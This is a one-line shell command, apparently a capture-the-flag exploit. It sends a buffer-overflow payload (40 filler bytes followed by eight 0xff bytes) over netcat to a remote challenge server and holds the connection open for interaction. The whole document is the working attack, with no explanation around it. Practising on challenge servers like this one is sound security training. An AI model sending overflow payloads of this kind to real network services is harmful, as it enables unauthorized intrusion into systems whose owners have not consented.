(python2 -c "print(b'A'*40 + b'\xff'*8)"; cat) | nc mc.ax 31199
